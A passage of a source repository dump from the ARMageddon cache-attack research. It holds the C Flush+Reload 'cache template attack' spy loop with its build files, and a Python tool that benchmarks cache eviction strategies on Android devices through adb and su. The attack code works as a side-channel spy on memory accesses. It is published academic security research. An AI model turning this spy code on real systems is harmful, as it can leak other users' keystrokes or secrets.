  fprintf(stdout, "[x] Range: %zu\n", range);
  fprintf(stdout, "[x] Threshold: %zu\n", threshold);
  fprintf(stdout, "[x] Spy-mode: %s\n", (spy == true) ? "yes" : "no");
  fflush(stdout);

  /* Enable spy mode */
  if (spy == true) {
    range = 1;
  }

  /* Bind to CPU */
  size_t number_of_cpus = sysconf(_SC_NPROCESSORS_ONLN);

  /* Start master and slaves */
#ifndef WITH_THREADS
  pid_t pids[number_of_forks+1];
  for (unsigned int i = 0; i < number_of_forks+1; i++) {
    pids[i] = fork();

    if (pids[i] == -1) {
      fprintf(stderr, "Error: Failed to fork %d process\n", (unsigned int) i);
      exit(-2);
    } else if (pids[i] == 0) {
      libflush_bind_to_cpu((cpu + i) % number_of_cpus);

      if (i == 0) {
        fprintf(stdout, "[x] Master process %d with pid %d\n", (unsigned int) i, getpid());
        fflush(stdout);
        attack_master(range, spy, offset_update_time);
      } else {
#if LOCK_ROUND_ROBIN == 1
        lock_attr_t attr;
        attr.number_of_forks = number_of_forks;
        attr.fork_idx = i - 1;
        tal_init(&(shared_data->lock), &attr);
#else
        tal_init(&(shared_data->lock), NULL);
#endif

        fprintf(stdout, "[x] Slave process %d with pid %d\n", (unsigned int) i, getpid());
        fflush(stdout);

        attack_slave(libflush_session, m, threshold, offset, number_of_tests,
            show_timing, logfile);
      }

      exit(0);
    }
  }

  /* Wait for slaves to finish */
  int status = 0;
  pid_t wait_pid = 0;
  while (true) {
    wait_pid = waitpid(pids[0], &status, WNOHANG|WUNTRACED);
    if (wait_pid == -1) {
      break;
    } else if (wait_pid == 0) {
      sleep(5);
    } else if (wait_pid == pids[0]) {
      printf("[x] Exit status of %d was %d\n", wait_pid, status);

      for (unsigned int i = 1; i < number_of_forks+1; i++) {
        if (kill(pids[i], SIGKILL) == -1) {
          fprintf(stderr, "Error: Could not kill process %d\n", pids[i]);
        }
      }

      break;
    }
  }

#else
  pthread_t* threads = calloc(number_of_forks, sizeof(pthread_t));
  if (threads == NULL) {
    return -1;
  }

  thread_data_t* thread_data = calloc(number_of_forks, sizeof(thread_data_t));
  if (thread_data == NULL) {
    return -1;
  }

  for (unsigned int i = 0; i < number_of_forks+1; i++) {
    thread_data[i].type = (i == 0) ? THREAD_FLUSH_AND_RELOAD : THREAD_FLUSH;
    thread_data[i].m = m;
    thread_data[i].range = range;
    thread_data[i].threshold = threshold;
    thread_data[i].offset = offset;
    thread_data[i].cpu_id = (cpu + i) % number_of_cpus;
    thread_data[i].spy = spy;
    thread_data[i].offset_update_time = offset_update_time;
    thread_data[i].number_of_tests = number_of_tests;
    thread_data[i].show_timing = show_timing;
    thread_data[i].logfile = logfile;
    thread_data[i].libflush_session = libflush_session;

    fprintf(stdout, "[x] Create thread %u\n", i);
    if (pthread_create(&threads[i], NULL, attack_thread, &thread_data[i]) != 0) {
      return -1;
    }
  }

  pthread_join(threads[0], NULL);

  free(threads);
  free(thread_data);
#endif

#ifndef WITH_THREADS
#ifdef WITH_ANDROID
  if (shared_data != NULL) {
    munmap(shared_data, sizeof(unsigned int));
  }

  if (shared_data_shm_fd != -1) {
    close(shared_data_shm_fd);
  }
#else
  if (shared_data != NULL) {
    shmdt(shared_data);
  }
  if (shared_data_shm_fd != -1) {
    shmctl(shared_data_shm_fd, IPC_RMID, 0);
  }
#endif
#endif

  /* Clean-up */
  if (logfile != NULL) {
    fclose(logfile);
  }

  munmap(m, range);
  close(fd);

  /* Terminate libflush */
  libflush_terminate(libflush_session);

  return 0;
}

#ifdef WITH_THREADS
void*
attack_thread(void* ptr)
{
  thread_data_t* thread_data = (thread_data_t*) ptr;

  libflush_bind_to_cpu(thread_data->cpu_id);

  if (thread_data->type == THREAD_FLUSH_AND_RELOAD) {
    attack_master(thread_data->range, thread_data->spy,
        thread_data->offset_update_time);
  } else if (thread_data->type == THREAD_FLUSH) {
    attack_slave(thread_data->libflush_session, thread_data->m,
        thread_data->threshold, thread_data->offset,
        thread_data->number_of_tests, thread_data->show_timing,
        thread_data->logfile);
  }

  pthread_exit(NULL);
}
#endif

static void
attack_master(size_t range, bool spy, useconds_t offset_update_time)
{
  do {
    for (shared_data->current_offset = 0; shared_data->current_offset < range; shared_data->current_offset += 64) {
      usleep(offset_update_time);
    }
  } while (spy == true);
}

static void
attack_slave(libflush_session_t* libflush_session, uint8_t* m, size_t threshold,
    size_t offset, size_t number_of_tests, bool show_timing, FILE* logfile)
{
  libflush_init(&libflush_session, NULL);
  size_t current_offset = shared_data->current_offset;

  /* Run Flush and reload */
  do {
    while (current_offset == shared_data->current_offset) {
      tal_lock(&(shared_data->lock));
      uint64_t hit_counter = 0;

      int pause = 0;
      for (unsigned int i = 0; i < number_of_tests; i++) {
        uint64_t count = libflush_reload_address_and_flush(libflush_session, m + current_offset);
        if (count < threshold) {
          if (pause > 1) {
            hit_counter++;
          }
          pause = 0;
        } else {
          pause++;
        }

        if (show_timing == true) {
          struct timespec time = {0,0};
          clock_gettime(CLOCK_MONOTONIC, &time);
          double measured_time = ((double)time.tv_sec + 1.0e-9*time.tv_nsec);

          fprintf(stdout, "%.5f: %8p - %" PRIu64 "\n", measured_time, (void*)
              (offset + current_offset), count);
          fflush(stdout);

          if (logfile != NULL) {
            fprintf(logfile, "%.f,%p,%" PRIu64 "\n", measured_time, (void*)
                (offset + current_offset), count);
          }
        }

        for (unsigned int u = 0; u < NUMBER_OF_YIELDS; u++) {
          sched_yield();
        }
      }

      if (hit_counter > 0 && show_timing == false) {
        fprintf(stdout, "%8p - %" PRIu64 "\n", (void*) (offset + current_offset), hit_counter);
        fflush(stdout);

        if (logfile != NULL) {
          fprintf(logfile, "%8p - %" PRIu64 "\n", (void*) (offset +
                current_offset), hit_counter);
        }
      }

      tal_unlock(&(shared_data->lock));
    }

    current_offset = shared_data->current_offset;
  } while (true);
}

```

`cache_template_attacks/cache_template_attack/threads.h`:

```h
 /* See LICENSE file for license and copyright information */

#ifndef THREADS_H
#define THREADS_H

#include <libflush/libflush.h>

typedef enum thread_type_e {
  THREAD_FLUSH_AND_RELOAD,
  THREAD_FLUSH
} thread_type_t;

typedef struct thread_data_s {
  thread_type_t type;
  uint8_t* m;
  size_t range;
  uint64_t threshold;
  size_t offset;
  size_t cpu_id;
  bool spy;
  size_t number_of_tests;
  useconds_t offset_update_time;
  bool show_timing;
  FILE* logfile;
  libflush_session_t* libflush_session;
} thread_data_t;

#endif  /*THREADS_H*/

```

`cache_template_attacks/colors.mk`:

```mk
# See LICENSE file for license and copyright information

ifeq ($(COLOR),1)
# GCC diagnostics colors
DIAGNOSTICS_COLOR_AVAILABLE ?= $(shell ($(CC) -fdiagnostics-color=always -E - </dev/null >/dev/null 2>/dev/null && echo 1) || echo 0)
ifeq ($(DIAGNOSTICS_COLOR_AVAILABLE),1)
CPPFLAGS     += -fdiagnostics-color=always
endif

# colorful output
TPUT ?= /usr/bin/tput
TPUT_AVAILABLE ?= $(shell ${TPUT} -V 2>/dev/null)

ifdef TPUT_AVAILABLE
COLOR_NORMAL  = `$(TPUT) sgr0`
COLOR_ACTION  = `$(TPUT) bold``$(TPUT) setaf 3`
COLOR_COMMENT = `$(TPUT) bold``$(TPUT) setaf 2`
COLOR_BRACKET = `$(TPUT) setaf 4`
define colorecho
	@echo $(COLOR_BRACKET)" ["$(COLOR_ACTION)$1$(COLOR_BRACKET)"] "$(COLOR_COMMENT)$2$(COLOR_BRACKET) $(COLOR_NORMAL)
endef
else
define colorecho
	@echo " [$1]" $2
endef
endif
else
define colorecho
	@echo " [$1]" $2
endef
endif

```

`cache_template_attacks/common.mk`:

```mk
# See LICENSE file for license and copyright information

ifeq "$(VERBOSE)" "0"
ECHO=@echo
QUIET=@
else
ECHO=@\#
QUIET=
endif

```

`cache_template_attacks/config-arm.mk`:

```mk
# Define Android specific variables
ANDROID_NDK_PATH = /opt/android-ndk
ANDROID_TOOLCHAIN_BIN = ${ANDROID_NDK_PATH}/toolchains/arm-linux-androideabi-4.9/prebuilt/linux-x86_64/bin
ANDROID_SYSROOT = ${ANDROID_NDK_PATH}/platforms/${ANDROID_PLATFORM}/arch-arm

ANDROID_CC = ${ANDROID_TOOLCHAIN_BIN}/arm-linux-androideabi-gcc
ANDROID_CC_FLAGS = --sysroot=${ANDROID_SYSROOT}

ANDROID_INCLUDES = -I ${ANDROID_NDK_PATH}/platforms/${ANDROID_PLATFORM}/arch-arm/usr/include
ANDROID_CFLAGS = ${ANDROID_INCLUDES} -march=armv7-a -fPIE
ANDROID_LDFLAGS = ${ANDROID_INCLUDES} -march=armv7-a -fPIE

CC = ${ANDROID_CC} ${ANDROID_CC_FLAGS}
CFLAGS += ${ANDROID_CFLAGS}
LDFLAGS += -pie

```

`cache_template_attacks/config-arm64.mk`:

```mk
# Define Android specific variables
ANDROID_NDK_PATH = /opt/android-ndk
ANDROID_TOOLCHAIN_BIN = ${ANDROID_NDK_PATH}/toolchains/aarch64-linux-android-4.9/prebuilt/linux-x86_64/bin
ANDROID_SYSROOT = ${ANDROID_NDK_PATH}/platforms/${ANDROID_PLATFORM}/arch-arm64

ANDROID_CC = ${ANDROID_TOOLCHAIN_BIN}/aarch64-linux-android-gcc
ANDROID_CC_FLAGS = --sysroot=${ANDROID_SYSROOT}

ANDROID_INCLUDES = -I ${ANDROID_NDK_PATH}/platforms/${ANDROID_PLATFORM}/arch-arm64/usr/include
ANDROID_CFLAGS = ${ANDROID_INCLUDES} -march=armv8-a -fPIE
ANDROID_LDFLAGS = ${ANDROID_INCLUDES} -march=armv8-a -fPIE

CC = ${ANDROID_CC} ${ANDROID_CC_FLAGS}
CFLAGS += ${ANDROID_CFLAGS} -flto
LDFLAGS += ${ANDROID_LDFLAGS} -pie -flto

```

`cache_template_attacks/config.mk`:

```mk
# See LICENSE file for license and copyright information

# project
PROJECT = cache_template_attack
VERSION = 0.0.1

# arch
ARCH = x86

# version checks
# If you want to disable any of the checks, set *_VERSION_CHECK to 0.

LIBFLUSH_VERSION_CHECK ?= 1
LIBFLUSH_MIN_VERSION = 0.0.1
LIBFLUSH_PKG_CONFIG_NAME = libflush

# pkg-config binary
PKG_CONFIG ?= pkg-config

# paths
PREFIX ?= /usr
DEPENDDIR ?= .depend
BUILDDIR ?= build/${ARCH}
BUILDDIR_RELEASE ?= ${BUILDDIR}/release
BUILDDIR_DEBUG ?= ${BUILDDIR}/debug
BINDIR ?= bin

# libs
LIBFLUSH_INC ?= $(shell ${PKG_CONFIG} --cflags libflush)
LIBFLUSH_LIB ?= $(shell ${PKG_CONFIG} --libs libflush)

INCS = ${LIBFLUSH_INC}
LIBS = ${LIBFLUSH_LIB}

# compiler flags
CFLAGS += -std=c11 -pedantic -Wall -Wno-format-zero-length -Wextra -O3 $(INCS)

# debug
DFLAGS ?= -g

# linker flags
LDFLAGS += -rdynamic

# compiler
CC ?= gcc

# strip
SFLAGS ?= -s

# valgrind
VALGRIND = valgrind
VALGRIND_ARGUMENTS = --tool=memcheck --leak-check=yes --leak-resolution=high \
	--show-reachable=yes --log-file=${PROJECT}-valgrind.log
VALGRIND_SUPPRESSION_FILE = ${PROJECT}.suppression

# set to something != 0 if you want verbose build output
VERBOSE ?= 0

# colors
COLOR ?= 1

# dist
TARFILE = ${PROJECT}-${VERSION}.tar.gz
TARDIR = ${PROJECT}-${VERSION}

# android
ANDROID_PLATFORM ?= android-21

# android device
WITH_ANDROID ?= 0

# thread support
WITH_THREADS ?= 0

```

`eviction_strategy_evaluator/LICENSE`:

```
Copyright (c) 2015-2016 Moritz Lipp

This software is provided 'as-is', without any express or implied
warranty. In no event will the authors be held liable for any damages
arising from the use of this software.

Permission is granted to anyone to use this software for any purpose,
including commercial applications, and to alter it and redistribute it
freely, subject to the following restrictions:

   1. The origin of this software must not be misrepresented; you must not
   claim that you wrote the original software. If you use this software
   in a product, an acknowledgment in the product documentation would be
   appreciated but is not required.

   2. Altered source versions must be plainly marked as such, and must not be
   misrepresented as being the original software.

   3. This notice may not be removed or altered from any source
   distribution.

```

`eviction_strategy_evaluator/README.md`:

```md
# Eviction Strategy Evaluator

Eviction Strategy Evaluator is a tool that utilizes [libflush](../libflush) to
find an effective and fast eviction strategy for any device.

It has been used for our [ARMageddon: Cache Attacks on Mobile Devices](https://www.usenix.org/conference/usenixsecurity16/technical-sessions/presentation/lipp) paper by Lipp, Gruss, Spreitzer, Maurice and Mangard that has been published at the Usenix Security Symposium 2016 and presented at [Black Hat Europe 2016](https://www.blackhat.com/eu-16/briefings/schedule/index.html#armageddon-how-your-smartphone-cpu-breaks-software-level-security-and-privacy-4887).

## Table of content

- [Installation](#installation)
    - [Dependencies](#dependencies)
- [Usage](#usage)
- [Configuration](#configuration)
    - [Global configuration](#global-configuration)
    - [Device configuration](#device-configuration)
- [Example](#example)
- [License](#license)
- [References](#references)

## Installation

The tool is shipped with a setup.py and can be compiled by running:
```bash
python setup.py install
```

### Dependencies
Eviction Strategy Evaluator builds the source code of [libflush](../libflush)
and, thus, the dependencies of [libflush](../libflush) need to be installed on
the host system. In addition, it requires the following dependencies:

* [click](http://click.pocoo.org) (required)
* [PyYAML](http://pyyaml.org) (required)
* [pandas](http://pandas.pydata.org) (required)
* [adb](https://developer.android.com/studio/command-line/adb.html) (to
    communicate with Android devices)

## Usage

```bash
eviction_strategy_evaluator [OPTIONS] <command> [COMMAND_OPTIONS]
```

The following options are available:

* **-c, --configuration-file** (required)

    Path to the used global configuration file.

* **-x, --device-configuration-file** (required)

    Path to the used device configuration file.

* **-v, --verbose**

    Verbose mode

* **-f, --force**

    Force mode to override files and re-compile existing binaries.

* **--help**

    Show the help information.

The following commands are available:

* **evaluate_strategy**

    Evaluates a single log file LOGFILE using the given
    threshold.

    The following options are available:

    * **-t, --threshold** (required)

      The threshold that is used to distinguish between a cache hit and a cache
      miss.

* **evaluate_strategies** [OPTIONS] LOGFILE_DIRECTORY

    Evaluates all log files in the given LOGFILE_DIRECTORY using the given
    threshold.

    The following options are available:

    * **-t, --threshold** (required)

      The threshold that is used to distinguish between a cache hit and a cache
      miss.

* **run_strategy**

    Compiles an eviction strategy for the target devices and executes it. Then
    it will pull the log file.

    The following options are available:

    * **-n, --number-of-measurements** 

      The number of measurements that should be taken.

    * **-e, --eviction-counter**  (required)

      The number of loop executions.

    * **-a, --number-of-accesses-in-loop**  (required)

      The number of accesses in a loop.

    * **-d, --different-addresses-in-loop**  (required)

      The number of accesses to different addresses in a loop.

    * **-s, --step-size** 

      The loop increment.

    * **-m, --mirroring** 

      If the eviction strategy should be mirrored.

* **run_strategies**

    Compile and run multiple eviction strategies for the target devices and executes them. Then
    it will pull the log files.

    The following options are available:

    * **-n, --number-of-measurements** 

      The number of measurements that should be taken.

    * **-e, --max-eviction-counter**  (required)

      The maximum number of loop executions.

    * **-a, --max-number-of-accesses-in-loop**  (required)

      The maximum number of accesses in a loop.

    * **-d, --max-different-addresses-in-loop**  (required)

      The maximum number of accesses to different addresses in a loop.

    * **-s, --max-step-size** 

      The maximum loop increment.

    * **-m, --with-mirroring** 

      If the eviction strategies should be also tested with mirroring.

## Configuration

In order to use the eviction strategy evaluator you need two different
configuration files. One global configuration file specifying the location of
the source of [libflush](../libflush) as well as the directories used for
storing the executables and logfiles. In addition, you need a device
configuration file that specifies several properties of the target device.

### Global configuration

The global configuration file must provide the following entries:

```yml
libflush:
  source-directory: /path/to/libflush
build:
  directory: /path/to/builds
logs:
  directory: /path/to/logs
```

### Device configuration

The device configuration file must provide the following entries:

```yml
device:
  name: Alcatel POP2 Touch
  codename: alto45
  arch: armv7
  adb-id: e7e3ca47
  executable-directory: /data/local/tmp
  log-directory: /data/local/tmp
  threshold: 95
cache:
  number-of-sets: 512
  line-length: 64
```

## Example

After you have created your configuration files you can evaluate different
strategies on it:

    eviction_strategy_evaluator -c config.yml -x alto45.yml run_strategies -e 25 -a 10 -d 10

Then you can evaluate them:

    eviction_strategy_evaluator -c config.yml -x alto45.yml evaluate_strategies /tmp/logs/alto45 -t 95

You will end up with a ``strategies.db`` as well as a ``strategies.csv`` file.

## License

[Licensed](LICENSE) under the zlib license.

## References

* [1] [ARMageddon: Cache Attacks on Mobile Devices (USENIX Security 2016) - Lipp, Gruss, Spreitzer, Maurice, Mangard](https://www.usenix.org/conference/usenixsecurity16/technical-sessions/presentation/lipp)
* [2] [ARMageddon: How Your Smartphone CPU Breaks Software-Level Security and Privacy (Black Hat Europe 2016) - Lipp, Maurice](https://www.blackhat.com/eu-16/briefings/schedule/index.html#armageddon-how-your-smartphone-cpu-breaks-software-level-security-and-privacy-4887)
* [3] [Cache Template Attacks: Automating Attacks on Inclusive Last-Level Caches (USENIX Security 2015) - Gruss, Spreitzer, Mangard](https://www.usenix.org/node/191011)

```

`eviction_strategy_evaluator/eviction_strategy_evaluator/__init__.py`:

```py
# libflush_eviction_evaluator

```

`eviction_strategy_evaluator/eviction_strategy_evaluator/build.py`:

```py
import logging
import os
from .utils import execute_command

logger = logging.getLogger('default')


class Builder(object):
    def __init__(self, configuration, strategy):
        self.configuration = configuration
        self.strategy = strategy

        # create build directory
        device_codename = self.strategy.device_configuration['device']['codename']
        self.build_dir = os.path.join(configuration['build']['directory'], device_codename, self.strategy.get_name())

        if not os.path.exists(self.build_dir):
            os.makedirs(self.build_dir)

        # create strategy file
        self.strategy_file = os.path.join(self.build_dir, "strategy.h")
        self.strategy.save_strategy_to_file(self.strategy_file)

    def build(self, force):
        if os.path.exists(self.get_executable_path()) and not force:
            logger.info('Executable has already been build.')
            return False

        self.build_libflush()
        self.build_executable()

        return True

    def build_libflush(self):
        logger.info("Building libflush...")

        # compile libflush
        libflush_srcdir = self.configuration['libflush']['source-directory']
        architecture = self.strategy.device_configuration['device']['arch']

        libflush_build_dir = os.path.join(self.build_dir, "libflush")
        if not os.path.exists(libflush_build_dir):
            os.makedirs(libflush_build_dir)

        libflush_depend_dir = os.path.join(self.build_dir, ".depend")
        if not os.path.exists(libflush_depend_dir):
            os.makedirs(libflush_depend_dir)

        execute_command([
            "make",
            "-C",
            libflush_srcdir,
            "ARCH=" + architecture,
            "BUILDDIR=" + libflush_build_dir,
            "DEPENDDIR=" + libflush_depend_dir,
            "DEVICE_CONFIGURATION=" + self.strategy_file,
            "USE_EVICTION=1",
            "clean"
        ])

        execute_command([
            "make",
            "-C",
            libflush_srcdir,
            "ARCH=" + architecture,
            "BUILDDIR=" + libflush_build_dir,
            "DEPENDDIR=" + libflush_depend_dir,
            "DEVICE_CONFIGURATION=" + self.strategy_file,
            "USE_EVICTION=1"
        ])

    def build_executable(self):
        logger.info("Building executable...")

        current_path = os.path.dirname(os.path.abspath(__file__))
        executable_srcdir = os.path.join(current_path, "source")
        libflush_srcdir = self.configuration['libflush']['source-directory']
        architecture = self.strategy.device_configuration['device']['arch']
        libflush_build_dir = os.path.join(self.build_dir, "libflush")

        executable_build_dir = os.path.join(self.build_dir, "executable")
        if not os.path.exists(executable_build_dir):
            os.makedirs(executable_build_dir)

        executable_depend_dir = os.path.join(self.build_dir, ".depend")
        if not os.path.exists(executable_depend_dir):
            os.makedirs(executable_depend_dir)

        execute_command([
            "make",
            "-C",
            executable_srcdir,
            "LIBFLUSH_SOURCE=" + libflush_srcdir,
            "LIBFLUSH_INC=" + libflush_srcdir,
            "LIBFLUSH_BUILDDIR=" + libflush_build_dir,
            "DEPENDDIR=" + executable_depend_dir,
            "ARCH=" + architecture,
            "BUILDDIR=" + executable_build_dir,
            "clean"
        ])

        execute_command([
            "make",
            "-C",
            executable_srcdir,
            "LIBFLUSH_SOURCE=" + libflush_srcdir,
            "LIBFLUSH_INC=" + libflush_srcdir,
            "LIBFLUSH_BUILDDIR=" + libflush_build_dir,
            "DEPENDDIR=" + executable_depend_dir,
            "ARCH=" + architecture,
            "BUILDDIR=" + executable_build_dir
        ])

    def get_executable_path(self):
        executable_build_dir = os.path.join(self.build_dir, "executable")
        executable_path = os.path.join(executable_build_dir, "release/bin/executable")

        return executable_path

```

`eviction_strategy_evaluator/eviction_strategy_evaluator/config.py`:

```py
import yaml
import logging
from collections import Iterable

logger = logging.getLogger('default')


def check_subconfiguration(config, identifier, config_variables):
    invalid_configuration = False

    if identifier not in config:
        invalid_configuration = True
        logger.debug('No "cache" section in device configuration')
    elif not isinstance(config[identifier], Iterable):
        logger.debug('"%s" is no valid section in the device configuration', identifier)
        invalid_configuration = True
    else:
        for config_name, config_type, config_required in config_variables:
            if config_name not in config[identifier]:
                if config_required is True:
                    logger.debug('No "%s" defined in "%s" section of the device configuration', config_name, identifier)
                    invalid_configuration = True
                continue

            if type(config[identifier][config_name]) is not config_type:
                logger.debug('Incorrect type for "%s" defined in the "%s" section of the device configuration', config_name, identifier)
                invalid_configuration = True
                continue

    return invalid_configuration

def parse_configuration(filename):
    try:
        config = yaml.safe_load(open(filename))
    except:
        return None

    invalid_configuration = False

    libflush_config_names = [
        ('source-directory', str, True)
    ]

    invalid_configuration = check_subconfiguration(config, 'libflush', libflush_config_names)

    build_config_names = [
        ('directory', str, True)
    ]

    invalid_configuration = check_subconfiguration(config, 'build', build_config_names)

    logs_config_names = [
        ('directory', str, True)
    ]

    invalid_configuration = check_subconfiguration(config, 'logs', logs_config_names)

    if invalid_configuration is True:
        return None

    return config


def parse_device_configuration(filename):
    try:
        config = yaml.safe_load(open(filename))
    except:
        return None

    invalid_configuration = False

    device_config_names = [
        ('name',                 str, False),
        ('codename',             str, True),
        ('arch',                 str, True),
        ('threshold',            int, False),
        ('adb-id',               str, False),
        ('executable-directory', str, False),
        ('log-directory',        str, False)
    ]

    invalid_configuration = check_subconfiguration(config, 'device', device_config_names)

    cache_config_names = [
        ('number-of-sets', int, True),
        ('line-length',    int, True)
    ]

    invalid_configuration = check_subconfiguration(config, 'cache', cache_config_names)

    if invalid_configuration is True:
        return None

    return config

```

`eviction_strategy_evaluator/eviction_strategy_evaluator/evaluate.py`:

```py
import os
import pandas as pd
import numpy as np
import logging


def evaluate_strategy_logfile(logfile, device_configuration, threshold):
    # read log file
    try:
        df = pd.read_csv(logfile, dtype={'Miss': float, 'Runtime': float, 'RuntimeBatch': float})
    except:
        return None
    number_of_batches = df.count().RuntimeBatch
    number_of_measurements = df.count().Miss
    # df.loc[len(str(df.Runtime)) > 15] = np.nan
    # df = df.convert_objects(convert_numeric=True)

    # parse filename
    strategy_name = os.path.basename(logfile)[:-4]
    parts = strategy_name.split("-")
    if len(parts) != 5:
        logging.error('Invalid filename: "%s"', logfile)
        return None

    logging.info('Evaluating %s' % strategy_name)
    print('Evaluating %s' % strategy_name)

    number_of_addresses = parts[0]
    number_of_accesses_in_loop = parts[1]
    different_addresses_in_loop = parts[2]
    step_size = parts[3]
    mirrored = True if parts[4] is "M" else False

    # filter outliners
    df = df[np.abs(df-df.mean()) <= (3*df.std())]
    df_count = df.count()

    # calculate eviction rate
    correct_misses = df.Miss[df.Miss > threshold].size
    all_misses = df_count.Miss

    rate = correct_misses / all_misses * 100.0

    # calculate average runtime
    # architecture = device_configuration['device']['arch']
    # if architecture == "armv7": # div64 is enabled by default
    #     df.RuntimeBatch *= 64

    average_runtime = df.Runtime.mean()
    average_runtime_batch = df.RuntimeBatch.mean()
    batch_size = number_of_measurements / number_of_batches

    overhead = average_runtime - (average_runtime_batch / batch_size)

    # print("Average runtime: %d" % average_runtime)
    # print("Average runtime (batch) %d" % average_runtime_batch)
    # print("Average runtime per batch: %d" % (average_runtime_batch / batch_size))
    # print("Number of batches: %d" % number_of_batches)
    # print("Batch size: %d" % batch_size)
    # print("Overhead: %d" % overhead)

    return {
        "rate": rate,
        "average_runtime": average_runtime - overhead,
        "number_of_addresses": number_of_addresses,
        "number_of_accesses_in_loop": number_of_accesses_in_loop,
        "different_addresses_in_loop": different_addresses_in_loop,
        "step_size": step_size,
        "mirroring": mirrored,
        "raw": [strategy_name, number_of_addresses, number_of_accesses_in_loop, different_addresses_in_loop, step_size, mirrored, rate, average_runtime]
        }

```

`eviction_strategy_evaluator/eviction_strategy_evaluator/executor.py`:

```py
import logging
import os

from .utils import execute_command

logger = logging.getLogger('default')


class Executor(object):
    def __init__(self, configuration, strategy, builder):
        self.configuration = configuration
        self.strategy = strategy
        self.builder = builder
        self.device_configuration = self.strategy.device_configuration

    def run(self, number_of_runs, force):
        local_executable = self.builder.get_executable_path()

        # create logdir
        device_codename = self.strategy.device_configuration['device']['codename']
        log_dir = os.path.join(self.configuration['logs']['directory'], device_codename)
        if not os.path.exists(log_dir):
            os.makedirs(log_dir)
        local_logfile = os.path.join(log_dir, self.strategy.get_name() + ".log")

        # check if log file exists
        if os.path.exists(local_logfile) and not force:
            logger.info('Strategy logfile already exists.')
            return False

        if 'adb-id' in self.device_configuration['device']:
            return self.__run_android(local_executable, local_logfile, number_of_runs)
        else:
            return self.__run_local(local_executable, local_logfile, number_of_runs)

    def __run_android(self, local_executable, local_logfile, number_of_runs):
        remote_executeable_dir = self.device_configuration['device']['executable-directory']
        remote_executable = os.path.join(remote_executeable_dir, self.strategy.get_name())
        remote_logfile = os.path.join(remote_executeable_dir, self.strategy.get_name() + ".log")
        adb_id = self.device_configuration['device']['adb-id']

        # Upload
        logger.info("Uploading executable")
        execute_command([
            "adb",
            "-s", adb_id,
            "push",
            local_executable,
            remote_executable
        ])

        # Setting chmod
        logger.info("Setting change mode")
        execute_command([
            "adb",
            "-s", adb_id,
            "shell",
            "su",
            "-c",
            "'",
            "chmod",
            "777",
            remote_executable,
            "'"
        ])

        # Running
        logger.info("Running measurements")
        execute_command([
            "adb",
            "-s", adb_id,
            "shell",
            "su",
            "-c",
            "'",
            remote_executable,
            "-n", str(number_of_runs),
            "-c", "0",
            remote_logfile,
            "'"
        ])

        execute_command([
            "adb",
            "-s", adb_id,
            "shell",
            "su",
            "-c",
            "'",
            "chmod",
            "777",
            remote_logfile,
            "'"
        ])

        # Running
        logger.info("Fetching results")
        execute_command([
            "adb",
            "-s", adb_id,
            "pull",
            remote_logfile,
            local_logfile
        ])

        # Clean-up
        logger.info("Cleaning up")
        execute_command([
            "adb",
            "-s", adb_id,
            "shell",
            "su",
            "-c",
            "'",
            "rm",
            remote_executable,
            "'"
        ])

        execute_command([
            "adb",
            "-s", adb_id,
            "shell",
            "su",
            "-c",
            "'",
            "rm",
            remote_logfile,
            "'"
        ])

        return True

    def __run_local(self, local_executable, local_logfile, number_of_runs):
        execute_command([
            local_executable,
            "-n", str(number_of_runs),
            local_logfile
        ])

        return True

```

`eviction_strategy_evaluator/eviction_strategy_evaluator/log.py`:

```py
import logging


def setup_custom_logger(name):
    formatter = logging.Formatter(fmt='%(asctime)s - %(levelname)s - %(module)s - %(message)s')

    handler = logging.StreamHandler()
    handler.setFormatter(formatter)

    logger = logging.getLogger(name)
    logger.setLevel(logging.INFO)
    logger.addHandler(handler)
    return logger

```

`eviction_strategy_evaluator/eviction_strategy_evaluator/main.py`:

```py
import click
import logging
import os
import pandas as pd
import sqlite3
from . import log

logger = log.setup_custom_logger('default')

from .strategy import Strategy
from .build import Builder
from .executor import Executor
from .evaluate import evaluate_strategy_logfile

from eviction_strategy_evaluator.config import parse_device_configuration
from eviction_strategy_evaluator.config import parse_configuration

def run_strategy(ctx, number_of_measurements, eviction_counter, number_of_accesses_in_loop,
                 different_addresses_in_loop, step_size, mirroring):
    """Builds and runs an eviction strategy"""
    configuration = ctx.obj['configuration']
    device_configuration = ctx.obj['device-configuration']

    strategy = Strategy(configuration, device_configuration,
                        eviction_counter,
                        number_of_accesses_in_loop,
                        different_addresses_in_loop,
                        step_size,
                        mirroring)

    logger.info("Evaluating %s", strategy.get_name())

    strategy.build(ctx.obj['force'])
    strategy.run(number_of_measurements, ctx.obj['force'])

    return strategy

@click.command('run_strategy')
@click.option('-n', '--number-of-measurements', type=int, required=False, default=10000)
@click.option('-e', '--eviction-counter', type=int, required=True)
@click.option('-a', '--number-of-accesses-in-loop', type=int, required=True)
@click.option('-d', '--different-addresses-in-loop', type=int, required=True)
@click.option('-s', '--step-size', type=int, required=False, default=1)
@click.option('-m', '--mirroring', type=bool, required=False, default=False)
@click.pass_context
def cmd_run_strategy(ctx, number_of_measurements, eviction_counter, number_of_accesses_in_loop,
                 different_addresses_in_loop, step_size, mirroring):
    device_configuration = ctx.obj['device-configuration']

    strategy = run_strategy(ctx, number_of_measurements, eviction_counter, number_of_accesses_in_loop,
                 different_addresses_in_loop, step_size, mirroring)

    logfile = strategy.get_logfile_name()

    # read log file
    result = evaluate_strategy_logfile(logfile, device_configuration, device_configuration['device']['threshold'])
    if result:
        logger.info("Eviction rate: %f%%", result['rate'])
        logger.info("Average runtime: %f", result['average_runtime'])

@click.command('run_strategies')
@click.option('-n', '--number-of-measurements', type=int, required=False, default=10000)
@click.option('-e', '--max-eviction-counter', type=int, required=True)
@click.option('-a', '--max-number-of-accesses-in-loop', type=int, required=True)
@click.option('-d', '--max-different-addresses-in-loop', type=int, required=True)
@click.option('-s', '--max-step-size', type=int, required=False, default=1)
@click.option('-m', '--with-mirroring', type=bool, required=False, default=False)
@click.pass_context
def cmd_run_strategies(ctx, number_of_measurements, max_eviction_counter, max_number_of_accesses_in_loop,
                 max_different_addresses_in_loop, max_step_size, with_mirroring):
    # Generate all strategies and test them
    for a_i in range(max_number_of_accesses_in_loop, 0, -1):
        for d_i in range(max_different_addresses_in_loop, 0, -1):
            for s_i in range(max_step_size, 0, -1):
                if d_i < s_i:
                    continue

                for e_i in range(max_eviction_counter, 0, -1):
                    number_of_addresses = e_i + d_i - 1
                    if (number_of_addresses >= d_i):
                        run_strategy(ctx, number_of_measurements, e_i, a_i, d_i, s_i, False)

                        if with_mirroring is True:
                            run_strategy(ctx, number_of_measurements, e_i, a_i, d_i, s_i, True)

@click.command('evaluate_strategy')
@click.argument('logfile', type=click.Path(exists=True), required=True)
